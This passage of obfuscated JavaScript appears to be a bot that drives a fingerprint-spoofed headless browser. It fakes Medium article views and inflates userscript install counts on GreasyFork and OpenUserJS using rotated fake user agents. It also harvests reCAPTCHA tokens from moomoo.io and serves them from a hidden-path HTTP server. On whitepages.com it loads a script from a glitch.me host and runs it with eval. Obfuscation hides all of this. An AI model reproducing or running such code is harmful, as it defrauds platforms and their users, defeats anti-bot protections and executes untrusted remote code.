      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + Y(0x1a, 'YqZp') + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + W(0xd) + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + Y(0x0, '[@gQ') + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + X(0x14) + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + Y(0x1c, '@u0H') + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + Y(0x2, '119m') + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + Y(0x10, 'nCjh') + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x144a + -0x25 * -0x53 + -0x2049
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require(Z(0x19) + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x23f + -0x155b + -0x13 * -0x13e)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x761 * -0x4 + 0x1e51 + 0x3 * -0x23), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1f6e + 0x1da4 + 0x22e), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1df4 + -0x1b * -0x36 + -0x75 * 0x4e;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x1fcd + 0x221c + -0x41e9; w < getRandomInt(-0x1294 + 0x38d + 0x1a * 0x94, 0x6f4 + -0x69e + 0x3 * -0x1b); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x347b * 0x2 + 0x173c * -0x13 + -0x2 * -0x18665);
        }
      }();
    }, 0x19e6 + 0x20a5 + 0x3a27 * -0x1), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x241a + -0x4d6 + 0x28f0;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x626 * -0x3 + 0x5a7 * 0x3 + 0x1 * -0x2367, -0xdb3 + -0xf1 * -0x1c + -0xc77)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x3 * 0x47a7 + -0xb * -0xdab + -0xf81e * 0x1);
    }, -0x15bd + -0x8 * 0x319 + 0x2ee9), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a1 = b;
        try {
          let s = 0x21d * -0x6 + -0x1 * 0xb41 + 0xb * 0x22d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x8b + -0x1877 + 0x24ba * 0x1), await u['evaluate'](() => {
            const a0 = d;
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + a0(0xb) + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x160a + 0x149d + 0x16d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x4c2ce * -0x3 + -0x376 * -0x115 + 0x3a4 * -0x12e);
        } catch (v) {}
        return await page[a1(0x13, '5tM7')](), await context['close'](), r();
      }());
    }, 0x1f14 + 0x1 * 0x8b1 + -0x2761 * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1a5e + 0x127 * 0x14 + -0x33e * 0xf);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x3189 + 0x737 * 0x4 + -0x13 * 0x277);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = b;
  async function f() {
    const a2 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x13 * 0x1 + -0x147c + 0xc9 * 0x1a) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x21ce + 0x8b3 + -0x2a80));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x26c7 * -0x1 + -0x231f + -0x3a8, D['indexOf']('\x20'));
        return B ? E['slice'](-0xb29 + 0x5 * 0x27a + -0x139, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xc92 + 0x4553 * 0x1 + 0xff * -0x2b),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': a2(0x7),
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x4782 + -0x93 * 0x1f + 0x805f),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      a3(0x16, '(Ig$') + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + a3(0xa, 'b6J^') + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
